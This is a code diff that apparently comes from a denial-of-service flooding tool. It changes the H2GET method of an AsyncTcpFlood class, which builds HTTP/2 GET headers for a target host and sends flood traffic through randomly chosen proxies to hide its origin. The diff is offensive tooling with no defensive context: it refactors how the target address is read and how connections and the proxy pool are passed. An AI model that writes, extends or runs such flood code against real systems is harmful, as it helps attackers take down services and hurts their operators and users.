@@ -308,15 +308,21 @@ class AsyncTcpFlood(FloodBase):
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def H2GET(self, on_connect=None) -> bool:
-        path_qs = path_qs or self.default_path_qs
-        header = [
+        path_qs = self._target.url.path_qs or self.default_path_qs
+        headers = [
             (':method', 'GET'),
             (':path', path_qs),
-            (':authority', self._target.host),
+            (':authority', self._target.url.host),
             (':scheme', 'https'),
         ]
         on_close = self._loop.create_future()
-        flood_proto = partial(H2FloodIO, self._loop, headers, on_close)
+        flood_proto = partial(
+            H2FloodIO,
+            self._loop,
+            headers,
+            on_close,
+            connections=self._connections
+        )
         proxy_url: Optional[str] = self._proxies.pick_random()
         server_hostname = ""
         if proxy_url is None:
@@ -331,9 +337,10 @@ class AsyncTcpFlood(FloodBase):
             proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
             flood_proto = partial(
                 proxy_protocol,
+                self._proxies,
                 self._loop,
                 on_close,
-                self._raw_target,
+                self._raw_address,
                 h2_ctx,
                 downstream_factory=flood_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
